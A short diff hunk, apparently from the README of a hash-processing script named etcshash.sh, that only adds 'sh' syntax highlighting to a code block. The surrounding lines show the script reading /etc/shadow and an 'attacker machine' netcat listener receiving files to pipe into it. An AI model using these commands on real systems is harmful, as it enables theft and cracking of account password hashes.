@@ -16,7 +16,7 @@ cat /etc/shadow | ./etcshash.sh -a
 ```
 
 as it reads from stdin it can also receive files sent e.g. from netcat:
-```
+```sh
 # attacker machine:
 nc -lvnp 1234 | ./etcshash.sh
 
